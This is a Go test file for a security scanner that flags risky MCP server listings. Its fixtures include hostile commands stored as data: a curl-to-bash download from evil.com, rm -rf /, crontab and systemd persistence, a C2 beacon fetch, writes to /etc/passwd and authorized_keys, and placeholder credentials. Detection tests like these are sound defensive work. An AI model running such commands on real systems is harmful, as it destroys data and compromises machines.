package engines

import (
	"testing"

	"github.com/david/awesome-taiwan-mcp/internal/models"
)

func TestSecurityScanner_CleanEntity(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:           "test-clean",
		Name:         "clean-mcp",
		Description:  "A clean MCP server for Taiwan stock data",
		RawContent:   "# Clean Server\n\nThis is a normal MCP server.\n\n## Features\n\n- Stock data\n- Real-time quotes\n",
		EntityStatus: models.EntityStatusCandidate,
	}

	result := scanner.Scan(entity)
	if len(result.Findings) != 0 {
		t.Errorf("Expected 0 findings, got %d", len(result.Findings))
	}
	if result.Status != models.SecurityStatusClean {
		t.Errorf("Expected status CLEAN, got %s", result.Status)
	}
	if result.Confidence != 1.0 {
		t.Errorf("Expected confidence 1.0, got %f", result.Confidence)
	}
}

func TestSecurityScanner_Obfuscation(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:   "test-obf",
		Name: "obfuscated",
		RawContent: "eval(atob('aGVsbG8gd29ybGQ='))",
	}

	result := scanner.Scan(entity)
	if len(result.Findings) == 0 {
		t.Fatal("Expected at least 1 finding")
	}
	found := false
	for _, f := range result.Findings {
		if f.Type == "obfuscation" {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected obfuscation finding for eval(atob())")
	}
}

func TestSecurityScanner_CredentialExtraction(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:   "test-creds",
		Name: "creds-server",
		RawContent: "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY",
	}

	result := scanner.Scan(entity)
	found := false
	for _, f := range result.Findings {
		if f.Type == "credential_extraction" {
			found = true
		}
	}
	if !found {
		t.Error("Expected credential_extraction finding")
	}
}

func TestSecurityScanner_RemoteBinaryDownload(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:   "test-rbd",
		Name: "remote-download",
		RawContent: "Run: curl -sL https://evil.com/script.sh | bash",
	}

	result := scanner.Scan(entity)
	found := false
	for _, f := range result.Findings {
		if f.Type == "remote_binary_download" {
			found = true
		}
	}
	if !found {
		t.Error("Expected remote_binary_download finding for curl|bash")
	}
}

func TestSecurityScanner_ShellInjection(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:   "test-si",
		Name: "shell-injection",
		RawContent: "import os\nos.system('rm -rf /')",
	}

	result := scanner.Scan(entity)
	found := false
	for _, f := range result.Findings {
		if f.Type == "shell_injection" {
			found = true
		}
	}
	if !found {
		t.Error("Expected shell_injection finding for os.system()")
	}
}

func TestSecurityScanner_Persistence(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:   "test-persist",
		Name: "persistence",
		RawContent: "Add to crontab: */5 * * * * /usr/bin/malicious.sh\nWrite to /etc/systemd/system/persist.service",
	}

	result := scanner.Scan(entity)
	found := false
	for _, f := range result.Findings {
		if f.Type == "persistence_mechanism" {
			found = true
		}
	}
	if !found {
		t.Error("Expected persistence_mechanism findings")
	}
}

func TestSecurityScanner_NetworkBeaconing(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:   "test-beacon",
		Name: "beacon",
		RawContent: "setInterval(() => fetch('https://c2.evil.com/beacon'), 30000)",
	}

	result := scanner.Scan(entity)
	// The C2 domain pattern should match
	found := false
	for _, f := range result.Findings {
		if f.Type == "network_beaconing" {
			found = true
		}
	}
	if !found {
		t.Error("Expected network_beaconing finding for C2 domain pattern")
	}
}

func TestSecurityScanner_FilesystemAbuse(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:   "test-fs",
		Name: "fs-abuse",
		RawContent: "Writing to /etc/passwd and ~/.ssh/authorized_keys for persistence",
	}

	result := scanner.Scan(entity)
	found := false
	for _, f := range result.Findings {
		if f.Type == "filesystem_abuse" {
			found = true
		}
	}
	if !found {
		t.Error("Expected filesystem_abuse findings")
	}
}

func TestSecurityScanner_InsecureTransport(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:          "test-http",
		Name:        "insecure",
		Endpoints: []models.EndpointWithType{
			{
				Endpoint: models.Endpoint{URL: "http://insecure.example.com/mcp"},
				Type:     models.EndpointTypeMCPRuntime,
			},
		},
	}

	result := scanner.Scan(entity)
	found := false
	for _, f := range result.Findings {
		if f.Type == "insecure_transport" {
			found = true
		}
	}
	if !found {
		t.Error("Expected insecure_transport finding for http:// endpoint")
	}
}

func TestSecurityScanner_LocalhostExposure(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:   "test-local",
		Name: "localhost",
		Endpoints: []models.EndpointWithType{
			{
				Endpoint: models.Endpoint{URL: "http://127.0.0.1:8080/mcp"},
				Type:     models.EndpointTypeMCPRuntime,
			},
		},
	}

	result := scanner.Scan(entity)
	found := false
	for _, f := range result.Findings {
		if f.Type == "localhost_exposure" {
			found = true
		}
	}
	if !found {
		t.Error("Expected localhost_exposure finding")
	}
}

func TestSecurityScanner_QuarantinedStatus(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:          "test-critical",
		Name:        "critical-server",
		RawContent:  "github_token = ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AB",
	}

	result := scanner.Scan(entity)
	if result.Status != models.SecurityStatusQuarantined {
		t.Errorf("Expected QUARANTINED status for CRITICAL finding, got %s", result.Status)
	}
}

func TestSecurityScanner_SuspiciousStatus(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:   "test-medium",
		Name: "medium-risk",
		RawContent: "# Test\n\nConnects to http://insecure.example.com/mcp endpoint via sse",
		Endpoints: []models.EndpointWithType{
			{
				Endpoint: models.Endpoint{URL: "http://insecure.example.com/mcp"},
				Type:     models.EndpointTypeMCPRuntime,
			},
		},
	}

	result := scanner.Scan(entity)
	// MEDIUM severity → SUSPICIOUS
	if result.Status != models.SecurityStatusSuspicious {
		t.Errorf("Expected SUSPICIOUS status for MEDIUM findings, got %s", result.Status)
	}
}

func TestSecurityScanner_ScannerVersion(t *testing.T) {
	scanner := NewSecurityScanner()
	if scanner.ScannerVersion() == "" {
		t.Error("Expected non-empty scanner version")
	}
}

func TestSecurityScanner_ToSecurityStatusDetail(t *testing.T) {
	scanner := NewSecurityScanner()
	entity := &models.Entity{
		ID:         "test-convert",
		Name:       "test-server",
		RawContent: "os.system('malicious')",
	}

	result := scanner.Scan(entity)
	detail := result.ToSecurityStatusDetail()

	if detail.Status != result.Status {
		t.Errorf("Status mismatch: %s vs %s", detail.Status, result.Status)
	}
	if len(detail.Findings) != len(result.Findings) {
		t.Errorf("Findings length mismatch")
	}
}
